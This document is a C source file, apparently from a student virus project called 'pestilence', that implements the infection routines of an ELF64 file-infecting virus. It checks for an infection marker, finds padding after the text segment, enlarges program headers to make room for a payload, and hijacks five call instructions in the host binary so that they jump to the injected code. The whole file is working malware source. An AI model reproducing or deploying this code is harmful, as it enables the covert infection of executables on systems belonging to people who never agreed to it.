#include "pestilence.h"

static int	check_magic(t_info *info)
{
	void *addr;

	addr = info->text_begin + info->text_size - 4 - SIGN_SIZE;
	if (*(uint32_t *)addr ==  MAGIC_VIRUS)
		return (1);
	return (0);
}

static size_t	get_padding_size(t_info *info, Elf64_Phdr *program_header, int nb_hp)
{
	Elf64_Phdr  *crawler;
	int32_t     i;  
	size_t      next_offset;
	int32_t     found;

	next_offset = -1; 
	crawler = (Elf64_Phdr *)(info->file + sizeof(Elf64_Ehdr));
	i = 0;
	found = 0;
	while (i < nb_hp)
	{   
		if ((crawler != program_header) && (crawler->p_offset > program_header->p_offset + program_header->p_filesz))
		{   
			if (next_offset > crawler->p_offset)
			{   
				next_offset = crawler->p_offset;
				found = 1;
			}   
		}   
		i++;
		crawler++;
	}   
	if (found == 0)
		return (0);
	return (next_offset - (program_header->p_offset + program_header->p_filesz));
}

static int	valid_call(t_info *info, int pos)
{
	int32_t		dest;
	uint32_t	prolog;

	dest = *((int32_t *)(info->text_begin + pos));
	if ((dest + pos + 4 < 0) || ((size_t)(dest + pos + 4) > info->text_size))
		return (1);
	prolog = *((int32_t *)(info->text_begin + dest + pos + 4));
	// classic prolog
	if (prolog == 0xe5894855)
	{
		info->addr_hooked_func = info->text_begin + dest + pos + 4;
		return (0);
	}
	// plt prolog
	prolog &= 0xFFFF;
	if (prolog == 0x25FF)
	{
		info->addr_hooked_func = info->text_begin + dest + pos + 4;
		return (0);
	}
	return (1);
}


int		find_text(t_info *info)
{
	Elf64_Ehdr	*main_header;
	Elf64_Phdr	*header;
	int32_t		i;
	size_t		base_entry;

	main_header = (Elf64_Ehdr *)(info->file);
	base_entry = main_header->e_entry;
	i = 0;
	header = (Elf64_Phdr *)(info->file + sizeof(Elf64_Ehdr));
	while (i < main_header->e_phnum)
	{
		if ((header->p_type == PT_LOAD) && (base_entry > header->p_vaddr) && (base_entry < header->p_vaddr + header->p_memsz))
		{
			info->text_begin = header->p_offset + info->file;
			info->text_size = header->p_filesz;
			if (check_magic(info) == 1)
				return (1);
			if (get_padding_size(info, header, main_header->e_phnum) < INJECT_SIZE)
				return (1);
			info->text_addr = header->p_vaddr;
			header->p_filesz += INJECT_SIZE;
			header->p_memsz += INJECT_SIZE;
			return (0);
		}
		header++;
		i++;
	}
	return (0);
}

static void	hook_call(t_info *info, int32_t nb)
{
	int32_t	new_jmp;

	new_jmp = (int32_t)(info->text_size - (size_t)((size_t)(info->addr_call_to_replace) - (size_t)(info->text_begin)) - 5);
	new_jmp += (4 *(nb - 1));
	ft_memcpy(info->addr_call_to_replace + 1, &new_jmp, sizeof(new_jmp));
}

void		epo_parsing(t_info *info)
{
	size_t	i;
	int32_t	nb_call_detected;
	int32_t	to_infect[5];
	uint8_t	c;

	i = 0;
	nb_call_detected = 0;
	while (i < info->text_size)
	{
		c = *((uint8_t *)(info->text_begin + i));
		if (c == 0xe8 && i + 4 < info->text_size && (valid_call(info, i + 1) == 0))
			nb_call_detected++;
		i++;
	}
	if (nb_call_detected < 5)
	{
		info->valid_target = 0;
		return ;
	}
	to_infect[0] = 0;
	to_infect[1] = nb_call_detected / 5;
	to_infect[2] = (nb_call_detected * 2) / 5;
	to_infect[3] = (nb_call_detected * 3) / 5;
	to_infect[4] = (nb_call_detected * 4) / 5;

	i = 0;
	nb_call_detected = 0;
	int32_t	nb = 0;
	while (i < info->text_size && nb_call_detected <= to_infect[4])
	{
		c = *((uint8_t *)(info->text_begin + i));
		if (c == 0xe8 && i + 4 < info->text_size && (valid_call(info, i + 1) == 0))
		{
			if ((nb_call_detected == to_infect[0]) || (nb_call_detected == to_infect[1]) || (nb_call_detected == to_infect[2]) || (nb_call_detected == to_infect[3]) || (nb_call_detected == to_infect[4]))
			{
				nb++;
				info->addr_call_to_replace = info->text_begin + i;
				hook_call(info, nb);
				patch_end(info, nb);
			}
			nb_call_detected++;
		}
		i++;
	}
}

void		pe_parsing(t_info *info)
{
	Elf64_Phdr	*program_header;

	program_header = (Elf64_Phdr *)(info->file + sizeof(Elf64_Ehdr));
	while (program_header->p_type != PT_LOAD)
		program_header++;
	while(program_header->p_type == PT_LOAD)
		program_header++;
	program_header--;

	info->offset_payload = program_header->p_offset + program_header->p_memsz;
	info->addr_payload = program_header->p_vaddr + program_header->p_memsz;
	info->bss_size = program_header->p_memsz - program_header->p_filesz;
	info->begin_bss = program_header->p_offset + program_header->p_filesz;
	program_header->p_memsz += PAYLOAD_SIZE;
	program_header->p_filesz = program_header->p_memsz;
}
